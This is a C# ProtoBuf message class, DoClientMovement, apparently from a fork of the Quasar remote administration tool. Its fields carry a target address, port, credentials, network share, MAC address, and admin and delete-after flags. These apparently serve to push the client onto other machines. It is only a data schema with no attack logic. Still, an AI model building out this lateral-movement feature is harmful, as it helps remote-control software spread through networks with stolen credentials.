using ProtoBuf;
using Quasar.Common.Messages.other;

namespace Quasar.Common.Messages.Network
{
    [ProtoContract]
    public class DoClientMovement : IMessage
    {
        [ProtoMember(1)]
        public string Address { get; set; }

        [ProtoMember(2)]
        public int Port { get; set; }

        [ProtoMember(3)]
        public string Username { get; set; }

        [ProtoMember(4)]
        public string Password { get; set; }

        [ProtoMember(5)]
        public string Share { get; set; }

        [ProtoMember(6)]
        public string MAC { get; set; }

        [ProtoMember(7)]
        public bool AsAdmin { get; set; }

        [ProtoMember(8)]
        public bool DeleteAfter { get; set; }
    }
}
